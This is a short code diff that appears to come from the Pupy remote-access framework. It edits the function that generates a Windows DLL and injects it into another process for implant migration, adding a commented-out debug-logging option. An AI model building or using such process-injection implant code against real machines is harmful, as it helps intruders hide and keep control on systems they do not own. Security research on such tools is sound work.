@@ -1,6 +1,7 @@
 import pupygen
 import time
 import rpyc
+from pupygen import parse_scriptlets
 
 def has_proc_migrated(client, pid):
     for c in client.pupsrv.clients:
@@ -26,9 +27,13 @@ def migrate(module, pid, keep=False, timeout=30):
     else:
         arch='x86'
         module.success("process is 32 bits")
+    conf=module.client.get_conf()
+
+    #uncomment this to debug pupy injected DLL loading
+    #conf['offline_script']=parse_scriptlets(["stdout_to_file,path=C:\\pupy.log"], debug=False)
 
     dllbuff, filename, _ = pupygen.generate_binary_from_template(
-        module.client.get_conf(), 'windows',
+        conf, 'windows',
         arch=arch, shared=True
     )
     module.success("Template: {}".format(filename))
